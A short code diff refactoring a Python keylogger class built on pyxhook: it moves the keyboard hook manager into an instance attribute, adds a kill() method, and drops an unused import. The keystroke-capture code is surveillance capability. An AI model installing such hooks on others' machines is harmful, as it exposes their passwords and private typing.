@@ -1,4 +1,3 @@
-import daemon
 import logging
 import pyxhook
 
@@ -16,6 +15,9 @@ class Keylogger:
         """
         
         self.filename = filename
+        
+        # Start hook manager
+        self.manager = pyxhook.HookManager()
 
 
     def log(self):
@@ -23,15 +25,21 @@ class Keylogger:
         Start logging key presses
         """
         
-        # 
-        hook_manager = pyxhook.HookManager()
-        
         # Assign callback for handling key strokes.
-        hook_manager.KeyDown = self._keydown_callback
+        self.manager.KeyDown = self._keydown_callback
         
         # Hook the keyboard and start logging.
-        hook_manager.HookKeyboard()
-        hook_manager.start()
+        self.manager.HookKeyboard()
+        self.manager.start()
+        
+    def kill(self):
+        """
+        Stops logging key events
+        """
+        
+        # Stops listening for key events (I think?)
+        self.manager.cancel()
+        
 
     def _keydown_callback(self, key: pyxhook.pyxhook.PyxHookKeyEvent):
         """ 
